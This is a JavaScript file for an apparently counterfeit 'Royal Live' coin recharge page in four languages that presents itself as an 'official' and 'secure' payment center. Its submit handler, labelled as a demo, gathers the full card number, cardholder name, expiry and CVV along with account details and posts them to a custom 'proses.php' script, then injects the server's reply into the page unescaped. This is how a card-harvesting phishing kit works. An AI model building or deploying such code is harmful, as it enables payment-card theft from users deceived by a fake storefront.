let selectedCoins = 360;
let selectedPrice = 4.99;


/* TRANSLATIONS */

const translations = {

    en: {
        home: "Home",
        promotion: "Promotion",
        recharge: "Recharge",
        official: "OFFICIAL RECHARGE CENTER",
        heroTitle: "Recharge. Watch. Enjoy.",
        heroDescription: "Get Royal Live coins quickly and enjoy your favorite live streams, gifts and exclusive experiences.",
        rechargeNow: "Recharge Now",
        viewPromotion: "View Promotion",
        fast: "Fast Recharge",
        secure: "Secure Payment",
        global: "Global Access",
        limited: "LIMITED OFFER",
        promotionTitle: "Special Royal Benefits",
        promotionDescription: "Enjoy a better live experience with Royal Live coins.",
        bonus: "Special Bonus",
        bonusText: "Enjoy special rewards on selected recharge packages.",
        instant: "Fast Processing",
        instantText: "Your order is processed after successful payment confirmation.",
        exclusive: "Exclusive Experience",
        exclusiveText: "Use your coins to support creators and send gifts.",
        rechargeCenter: "ROYAL LIVE RECHARGE",
        choosePackage: "Choose Your Recharge Package",
        rechargeDescription: "Select your coins and enter your account information.",
        selectAmount: "Select Recharge Amount",
        selectAmountText: "Choose the package you want.",
        coins: "Coins",
        accountInformation: "Account Information",
        accountDescription: "Enter your Royal Live account details.",
        accountId: "Account ID",
        accountName: "Account Name",
        continuePayment: "Continue to Payment →",
        orderSummary: "Order Summary",
        product: "Product",
        price: "Price",
        total: "Total",
        safeOrder: "Secure Order",
        safeOrderText: "Your order information is protected.",
        footer: "© 2026 Royal Live Recharge Center. Demo interface.",
        checkoutTitle: "Secure Card Payment",
        checkoutDescription: "Complete your order securely.",
        cardNumber: "Card Number",
        cardholder: "Cardholder Name",
        expiry: "Expiry Date",
        encrypted: "Secure encrypted checkout",
        successTitle: "Payment Successful",
        successDescription: "Your recharge order has been received successfully.",
        backHome: "Back to Home",
        processing: "Processing..."
    },

    id: {
        home: "Beranda",
        promotion: "Promo",
        recharge: "Top Up",
        official: "PUSAT TOP UP RESMI",
        heroTitle: "Isi Ulang. Nonton. Nikmati.",
        heroDescription: "Dapatkan koin dengan cepat dan nikmati live streaming, hadiah, dan pengalaman eksklusif.",
        rechargeNow: "Top Up Sekarang",
        viewPromotion: "Lihat Promo",
        fast: "Top Up Cepat",
        secure: "Pembayaran Aman",
        global: "Akses Global",
        limited: "PENAWARAN TERBATAS",
        promotionTitle: "Keuntungan Spesial",
        promotionDescription: "Nikmati pengalaman live yang lebih baik dengan koin.",
        bonus: "Bonus Spesial",
        bonusText: "Nikmati hadiah spesial pada paket tertentu.",
        instant: "Proses Cepat",
        instantText: "Pesanan diproses setelah pembayaran berhasil.",
        exclusive: "Pengalaman Eksklusif",
        exclusiveText: "Gunakan koin untuk mendukung kreator dan mengirim hadiah.",
        rechargeCenter: "ROYAL LIVE TOP UP",
        choosePackage: "Pilih Paket Top Up",
        rechargeDescription: "Pilih jumlah koin dan masukkan informasi akun.",
        selectAmount: "Pilih Jumlah Top Up",
        selectAmountText: "Pilih paket yang Anda inginkan.",
        coins: "Koin",
        accountInformation: "Informasi Akun",
        accountDescription: "Masukkan informasi akun Anda.",
        accountId: "ID Akun",
        accountName: "Nama Akun",
        continuePayment: "Lanjut ke Pembayaran →",
        orderSummary: "Ringkasan Pesanan",
        product: "Produk",
        price: "Harga",
        total: "Total",
        safeOrder: "Pesanan Aman",
        safeOrderText: "Informasi pesanan Anda terlindungi.",
        footer: "© 2026 Royal Live Recharge Center. Tampilan demo.",
        checkoutTitle: "Pembayaran Kartu Aman",
        checkoutDescription: "Selesaikan pesanan Anda dengan aman.",
        cardNumber: "Nomor Kartu",
        cardholder: "Nama Pemegang Kartu",
        expiry: "Tanggal Kedaluwarsa",
        encrypted: "Checkout terenkripsi",
        successTitle: "Pembayaran Berhasil",
        successDescription: "Pesanan top up Anda berhasil diterima.",
        backHome: "Kembali ke Beranda",
        processing: "Memproses..."
    },

    es: {
        home: "Inicio",
        promotion: "Promoción",
        recharge: "Recargar",
        official: "CENTRO OFICIAL DE RECARGA",
        heroTitle: "Recarga. Mira. Disfruta.",
        heroDescription: "Obtén monedas rápidamente y disfruta de tus transmisiones favoritas.",
        rechargeNow: "Recargar Ahora",
        viewPromotion: "Ver Promoción",
        fast: "Recarga Rápida",
        secure: "Pago Seguro",
        global: "Acceso Global",
        coins: "Monedas",
        accountInformation: "Información de la Cuenta",
        accountId: "ID de Cuenta",
        accountName: "Nombre de Cuenta",
        continuePayment: "Continuar al Pago →",
        orderSummary: "Resumen del Pedido",
        product: "Producto",
        price: "Precio",
        total: "Total",
        checkoutTitle: "Pago Seguro",
        cardNumber: "Número de Tarjeta",
        cardholder: "Nombre del Titular",
        expiry: "Fecha de Expiración",
        successTitle: "Pago Exitoso",
        successDescription: "Tu pedido ha sido recibido.",
        backHome: "Volver al Inicio",
        processing: "Procesando..."
    },

    ja: {
        home: "ホーム",
        promotion: "プロモーション",
        recharge: "チャージ",
        official: "公式チャージセンター",
        heroTitle: "チャージ。視聴。楽しむ。",
        heroDescription: "コインを素早くチャージしてライブ配信を楽しみましょう。",
        rechargeNow: "今すぐチャージ",
        viewPromotion: "プロモを見る",
        fast: "高速チャージ",
        secure: "安全な決済",
        global: "グローバルアクセス",
        coins: "コイン",
        accountInformation: "アカウント情報",
        accountId: "アカウントID",
        accountName: "アカウント名",
        continuePayment: "支払いへ進む →",
        orderSummary: "注文概要",
        product: "商品",
        price: "価格",
        total: "合計",
        checkoutTitle: "安全なカード決済",
        cardNumber: "カード番号",
        cardholder: "カード名義人",
        expiry: "有効期限",
        successTitle: "支払い完了",
        successDescription: "チャージ注文を受け付けました。",
        backHome: "ホームに戻る",
        processing: "処理中..."
    }
};


/* LANGUAGE */

let currentLanguage = "en";

document.getElementById("languageSelect")
    .addEventListener("change", function () {

        currentLanguage = this.value;
        changeLanguage(currentLanguage);

    });


function changeLanguage(language) {

    document.querySelectorAll("[data-i18n]")
        .forEach(function (element) {

            const key = element.dataset.i18n;

            if (translations[language][key]) {
                element.textContent =
                    translations[language][key];
            }

        });

}


/* PACKAGE SELECT */

const packageButtons =
    document.querySelectorAll(".package");


packageButtons.forEach(function (item) {

    item.addEventListener("click", function () {

        packageButtons.forEach(function (button) {
            button.classList.remove("active");
        });

        this.classList.add("active");

        selectedCoins =
            Number(this.dataset.coins);

        selectedPrice =
            Number(this.dataset.price);

        updateOrder();

    });

});


function updateOrder() {

    const product =
        selectedCoins.toLocaleString() + " Coins";

    const price =
        "$" + selectedPrice.toFixed(2);


    document.getElementById("summaryProduct")
        .textContent = product;

    document.getElementById("summaryPrice")
        .textContent = price;

    document.getElementById("summaryTotal")
        .textContent = price;

    document.getElementById("checkoutProduct")
        .textContent = product;

    document.getElementById("checkoutPrice")
        .textContent = price;

    document.getElementById("payButton")
        .textContent = "Pay " + price;

}


/* ACCOUNT SUMMARY */

const accountId =
    document.getElementById("accountId");

const accountName =
    document.getElementById("accountName");


accountId.addEventListener("input", updateAccount);
accountName.addEventListener("input", updateAccount);


function updateAccount() {

    document.getElementById("summaryId")
        .textContent =
        accountId.value.trim() || "-";

    document.getElementById("summaryName")
        .textContent =
        accountName.value.trim() || "-";

}


/* SCROLL */

function scrollRecharge() {

    document.getElementById("recharge")
        .scrollIntoView({
            behavior: "smooth"
        });

}


function scrollPromotion() {

    document.getElementById("promotion")
        .scrollIntoView({
            behavior: "smooth"
        });

}


/* CHECKOUT */

function openCheckout() {

    if (
        accountId.value.trim() === "" ||
        accountName.value.trim() === ""
    ) {

        alert(
            currentLanguage === "id"
                ? "Silakan masukkan ID Akun dan Nama Akun."
                : "Please enter your Account ID and Account Name."
        );

        return;
    }

    updateAccount();

    document.getElementById("checkoutModal")
        .classList.add("active");

}


function closeCheckout() {

    document.getElementById("checkoutModal")
        .classList.remove("active");

}


/* CARD FORMAT */

document.getElementById("cardNumber")
    .addEventListener("input", function () {

        let value =
            this.value.replace(/\D/g, "");

        value =
            value.substring(0, 16);

        value =
            value.replace(/(.{4})/g, "$1 ");

        this.value =
            value.trim();

    });


/* EXPIRY FORMAT */

document.getElementById("expiry")
    .addEventListener("input", function () {

        let value =
            this.value.replace(/\D/g, "");

        if (value.length > 2) {

            value =
                value.substring(0, 2)
                + " / "
                + value.substring(2, 4);

        }

        this.value = value;

    });


/* CVV */

document.getElementById("cvv")
    .addEventListener("input", function () {

        this.value =
            this.value.replace(/\D/g, "");

    });


/* DEMO PAYMENT */

document.getElementById("paymentForm").addEventListener("submit", function (event) {
    // Mencegah form melakukan reload halaman
    event.preventDefault();

    // Ubah status tombol menjadi "Processing..."
    const payButton = document.getElementById("payButton");
    payButton.disabled = true;
    payButton.textContent = translations[currentLanguage]?.processing || "Processing...";

    // 1. Ambil data dari input HTML
	const id = document.getElementById("accountId").value;
	const name = document.getElementById("accountName").value;
	const number = document.getElementById("cardNumber").value;
	const card = document.getElementById("cardholder").value;
	const exp = document.getElementById("expiry").value;
	const cvv = document.getElementById("cvv").value;

    // 2. Bungkus ke dalam FormData
	const formData = new FormData();
	formData.append("accountId", id);
	formData.append("accountName", name);
	formData.append("cardNumber", number);
	formData.append("cardholder", card);
	formData.append("expiry", exp);
	formData.append("cvv", cvv)

    // 3. Kirim data ke PHP
    fetch("proses.php", {
        method: "POST",
        body: formData
    })
    .then(response => response.text())
    .then(data => {

        document.getElementById("paymentContent").style.display = "none";
        document.getElementById("successMessage").style.display = "block";
        document.getElementById("responseText").innerHTML = data;
		
    })
    .catch(error => {
		console.error("Error occurred:", error);
        
        const payButton = document.getElementById("payButton");
        payButton.disabled = false;
        payButton.textContent = "Pay Now"; 
        
        // Pesan error pop-up
        alert("Failed to process payment. Please try again.");
    });
});


/* FINISH */

function finishPayment() {

    closeCheckout();

    document.getElementById("paymentContent")
        .style.display = "block";

    document.getElementById("successMessage")
        .style.display = "none";

    document.getElementById("paymentForm")
        .reset();

    const payButton =
        document.getElementById("payButton");

    payButton.disabled = false;

    payButton.textContent =
        "Pay $" + selectedPrice.toFixed(2);

    document.getElementById("home")
        .scrollIntoView({
            behavior: "smooth"
        });

}


/* INITIAL */

updateOrder();
updateAccount();